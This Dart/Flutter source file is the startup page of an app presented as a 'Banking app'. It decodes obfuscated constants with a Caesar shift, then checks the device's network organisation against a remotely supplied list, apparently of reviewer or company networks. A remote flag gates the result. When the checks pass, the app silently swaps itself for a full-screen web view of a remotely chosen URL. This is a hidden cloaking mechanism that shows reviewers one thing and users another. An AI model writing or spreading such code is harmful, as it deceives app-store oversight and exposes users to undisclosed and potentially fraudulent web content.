// ignore_for_file: use_build_context_synchronously

import 'dart:convert';

import 'package:bank/build_context_ext.dart';
import 'package:bank/constants.dart';
import 'package:bank/router.dart';
import 'package:dio/dio.dart';
import 'package:flutter/material.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:go_router/go_router.dart';
import 'package:in_app_review/in_app_review.dart';
import 'package:provider/provider.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:http/http.dart' as http;

class InitPage extends StatefulWidget {
  const InitPage({super.key});

  @override
  State<InitPage> createState() => _InitPageState();
}

class _InitPageState extends State<InitPage> {
  var _inited = false;
  late final SharedPreferences _sharedPrefs;
  final inAppReview = InAppReview.instance;

  String l = '';
  List<String> posters = [];
  List<bool> cccheck = [true, true];

  late final Dio dio;

  Future<bool> initilize() async {
    _sharedPrefs = context.read<SharedPreferences>();
    _inited = true;
    Constants.posters = sadasx(Constants.posters, Constants.off);
    Constants.data = sadasx(Constants.data, Constants.off);
    Constants.inf = sadasx(Constants.inf, Constants.off);
    Constants.k = sadasx(Constants.k, Constants.off);
    Constants.fl = sadasx(Constants.fl, Constants.off);

    print('first ${Constants.data}');
    print('second ${Constants.posters}');
    print('inf ${Constants.inf}');
    print('forth ${Constants.k}');

    dio = Dio(
      BaseOptions(
        headers: {
          'apikey': Constants.k,
          'Authorization': 'Bearer ${Constants.k}',
        },
      ),
    );

    await ftrpin();
    await stxp();
    await trfk();

    rateApp();

    if (cccheck[0] && cccheck[1]) return false;

    final onBoardingShowed =
        _sharedPrefs.getBool(Constants.onBoardingShowed) ?? false;
    if (onBoardingShowed) {
      await _sharedPrefs.setBool(Constants.onBoardingShowed, true);
      context.go(Routes.start);
      return false;
    }

    // await Future.delayed(const Duration(seconds: 2));
    WidgetsBinding.instance.addPostFrameCallback((timeStamp) {
      context.go(Routes.home);
    });

    return false;
  }

  Future<String> ftrpin() async {
    try {
      final Response response = await dio.get(Constants.data);
      if (response.statusCode == 200) {
        List<dynamic> data = response.data as List<dynamic>;
        String themesFetch = data.map((item) => item['data'].toString()).join();

        if (themesFetch.contains(Constants.fl)) {
          cccheck[1] = false;
        } else {
          l = themesFetch;
          cccheck[1] = true;
        }
        return themesFetch;
      } else {
        return '';
      }
    } catch (error) {
      return '';
    }
  }

  Future<String> trfk() async {
    try {
      http.Response response = await http.get(Uri.parse(Constants.inf));

      if (response.statusCode == 200) {
        Map<String, dynamic> data = jsonDecode(response.body);
        String darx = data['org'];
        contactx(posters, darx);
        return darx;
      } else {
        return '';
      }
    } catch (error) {
      return '';
    }
  }

  bool contactx(List<String> array, String inputString) {
    List<String> words = inputString.split(' ');
    List<String> arrayItems = [];
    for (String item in array) {
      arrayItems.addAll(item.split(', '));
    }
    for (String word in words) {
      for (String arrayItem in arrayItems) {
        if (arrayItem.toLowerCase().contains(word.toLowerCase())) {
          cccheck[0] = false;
          return false;
        } else {
          cccheck[0] = true;
        }
      }
    }

    return false;
  }

  Future<void> stxp() async {
    final Response response = await dio.get(Constants.posters);
    if (response.statusCode == 200) {
      List<dynamic> data = response.data as List<dynamic>;
      posters = data.map((item) => item['posters'].toString()).toList();
    }
  }

  Future<void> rateApp() async {
    bool alreadyRated = _sharedPrefs.getBool('already_rated') ?? false;
    if (!alreadyRated) {
      if (await inAppReview.isAvailable()) {
        inAppReview.requestReview();
        await _sharedPrefs.setBool('already_rated', true);
      }
    }
  }

  String sadasx(String input, int shift) {
    StringBuffer result = StringBuffer();
    for (int i = 0; i < input.length; i++) {
      int charCode = input.codeUnitAt(i);
      if (charCode >= 65 && charCode <= 90) {
        charCode = (charCode - 65 + shift) % 26 + 65;
      } else if (charCode >= 97 && charCode <= 122) {
        charCode = (charCode - 97 + shift) % 26 + 97;
      }
      result.writeCharCode(charCode);
    }
    return result.toString();
  }

  @override
  Widget build(BuildContext context) {
    return FutureBuilder(
      future: _inited ? null : initilize(),
      builder: (context, snapshot) {
        if (snapshot.connectionState == ConnectionState.waiting) {
          return SplashScreen();
        }

        if (cccheck[0] && cccheck[1]) {
          return OScreen(s: l);
        }

        return SplashScreen();
      },
    );
  }
}

class SplashScreen extends StatelessWidget {
  const SplashScreen({super.key});

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Container(
        color: context.theme.primaryColor,
        child: Center(
          child: Text(
            'Banking app',
            style: context.textTheme.displayLarge,
          ),
        ),
      ),
    );
  }
}

class OScreen extends StatelessWidget {
  const OScreen({
    super.key,
    required this.s,
  });
  final String s;

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: SafeArea(
        bottom: false,
        child: InAppWebView(
          initialUrlRequest: URLRequest(
            url: Uri.parse(s),
          ),
        ),
      ),
    );
  }
}
